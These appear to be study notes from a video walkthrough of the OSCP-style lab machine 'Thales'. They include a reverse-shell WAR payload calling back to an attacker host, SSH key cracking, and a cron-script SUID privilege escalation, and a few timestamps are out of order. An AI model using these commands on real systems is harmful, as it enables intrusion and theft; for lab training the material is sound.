This video walkthrough for the machine **Thales** provides an excellent example of the full penetration testing cycle relevant to the OSCP certification, covering initial enumeration, gaining a low-privilege shell, lateral movement, and final privilege escalation.

Here are comprehensive notes and all major commands from the walkthrough, with timestamps for reference.

***

## 📝 OSCP Walkthrough Notes: Thales

### Phase 1: Initial Enumeration & Web Access

The target machine is running **Ubuntu** [[31:47](http://www.youtube.com/watch?v=RfYQxkPmRy4&t=1907)] and exposes two key ports: **22/TCP (SSH)** and **8080/TCP (Apache Tomcat)**.

| Step | Detail | Timestamp |
| :--- | :--- | :--- |
| **Nmap Scan** | Performed a full port scan (`-p-`), version detection (`-sV`), and default script execution (`-sC`). | [[30:12](http://www.youtube.com/watch?v=RfYQxkPmRy4&t=1812)] |
| **Target Port** | **8080/TCP** (Apache Tomcat 9.0.52) was identified as the primary attack vector due to the lack of SSH credentials. | [[31:30](http://www.youtube.com/watch?v=RfYQxkPmRy4&t=1890)] |
| **Web Vector** | The Tomcat Manager application is located at `/manager/html` and requires **HTTP Basic Authentication** (`username:password` Base64 encoded in the `Authorization` header). | [[36:31](http://www.youtube.com/watch?v=RfYQxkPmRy4&t=2191)] |
| **Brute Force** | Brute-forcing was performed using the **Metasploit Auxiliary Module**, which handles the necessary Base64 encoding. | [[44:56](http://www.youtube.com/watch?v=RfYQxkPmRy4&t=2696)] |
| **Credentials Found** | A valid credential set was found for the Tomcat Manager. | [[48:15](http://www.youtube.com/watch?v=RfYQxkPmRy4&t=2895)] |

### Phase 2: Gaining a Low-Privilege Shell (Tomcat: `tomcat`)

The vulnerability is the ability to upload and deploy a **WAR (Web Application Archive)** file via the Tomcat Manager.

| Action | Command | Timestamp |
| :--- | :--- | :--- |
| **Payload Generation** | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=[ATTACKER_IP] LPORT=[PORT] -f war -o offsec.war` | [[51:17](http://www.youtube.com/watch?v=RfYQxkPmRy4&t=3077)] |
| **Listener Setup** | `nc -nlvp [PORT]` | [[53:08](http://www.youtube.com/watch?v=RfYQxkPmRy4&t=3188)] |
| **Deployment** | The `offsec.war` file was uploaded and deployed via the Tomcat Web Application Manager (`/manager/html`), which resulted in a shell as the **`tomcat`** user. | [[54:35](http://www.youtube.com/watch?v=RfYQxkPmRy4&t=3275)] |

***

## 🔑 Key Commands for Access and Escalation

### Lateral Movement (User: `thales`)

The `tomcat` user was used to find SSH keys and credentials for the **`thales`** user, allowing for stable access.

| Action | Command / Output | Timestamp |
| :--- | :--- | :--- |
| **Loot Discovery** | `cd /home/thales/.ssh` and `cat id_rsa` (Found the private key) | [[57:02](http://www.youtube.com/watch?v=RfYQxkPmRy4&t=3422)] |
| **Key Hash Conversion** | `ssh2john.py id_rsa > crackme` (On Kali) | [[01:00:27](http://www.youtube.com/watch?v=RfYQxkPmRy4&t=3627)] |
| **Password Cracking** | `john --wordlist=/usr/share/wordlists/rockyou.txt crackme` | [[01:01:31](http://www.youtube.com/watch?v=RfYQxkPmRy4&t=3691)] |
| **User Password** | **`vodka06`** (Passphrase for `id_rsa` and the user's login password) | [[01:03:31](http://www.youtube.com/watch?v=RfYQxkPmRy4&t=3811)] |
| **Switch User** | `su thales` (Used the discovered password for a stable shell) | [[01:03:42](http://www.youtube.com/watch?v=RfYQxkPmRy4&t=3822)] |

### Privilege Escalation (User: `root`)

The path to root involved an exposed cron job and modifying the scheduled script.

| Action | Command / Output | Timestamp |
| :--- | :--- | :--- |
| **Initial Check** | `sudo -l` (No `sudo` permissions found) | [[01:04:39](http://www.youtube.com/watch?v=RfYQxkPmRy4&t=3879)] |
| **Loot Discovery** | `cat /home/thales/notes.txt` (Identified a backup script: `/usr/local/bin/backup.shell`) | [[01:08:18](http://www.youtube.com/watch?v=RfYQxkPmRy4&t=4098)] |
| **File Permissions** | `ls -la /usr/local/bin/backup.shell` (User `thales` has **write** permission to the script) | [[01:08:33](http://www.youtube.com/watch?v=RfYQxkPmRy4&t=4113)] |
| **Cron Job Monitoring** | `pspy64` (Executed on the target to monitor processes and revealed that `/usr/local/bin/backup.shell` is run by **root** periodically) | [[01:14:17](http://www.youtube.com/watch?v=RfYQxkPmRy4&t=4457)] |
| **Script Modification** | Overwrote or appended a payload to create a **SUID** binary. This command is executed by root when the cron job runs. | [[01:14:52](http://www.youtube.com/watch?v=RfYQxkPmRy4&t=4492)] |
| **Payload Command** | `echo 'cp /bin/dash /var/temp/dash' >> /usr/local/bin/backup.shell` | [[01:11:46](http://www.youtube.com/watch?v=RfYQxkPmRy4&t=4306)] |
| **SUID Command (Implied)** | `echo 'chmod u+s /var/temp/dash' >> /usr/local/bin/backup.shell` | [[01:12:08](http://www.youtube.com/watch?v=RfYQxkPmRy4&t=4328)] |
| **Root Access** | After the cron job runs, the new SUID binary is executed with the effective privileges flag. | [[01:20:55](http://www.youtube.com/watch?v=RfYQxkPmRy4&t=4855)] |
| **Final Command** | `/var/temp/dash -p` | [[01:20:55](http://www.youtube.com/watch?v=RfYQxkPmRy4&t=4855)] |
| **Verification** | `whoami` returns **`root`** | [[01:22:01](http://www.youtube.com/watch?v=RfYQxkPmRy4&t=4921)] |

***

### 💡 OSCP Takeaways

* **Enumeration is Key:** The discovery of Tomcat Manager and the `notes.txt` file were critical pivoting points.
* **Tools for the Job:** Use specialized tools like the Metasploit Tomcat auxiliary module for complex authentication schemes and `pspy64` to reveal scheduled processes (cron jobs).
* **Effective Permissions:** When escalating with an SUID binary like `dash` or `bash`, you must use the `-p` flag to ensure the shell runs with the **effective UID (root)**, not the real UID (your current user).
* **SUID Exploitation:** The sequence of: **Writable File (by you) $\rightarrow$ Executed by Root (via Cron) $\rightarrow$ Payload for SUID Binary $\rightarrow$ Execute SUID Binary** is a classic and effective privesc chain.

http://googleusercontent.com/youtube_content/0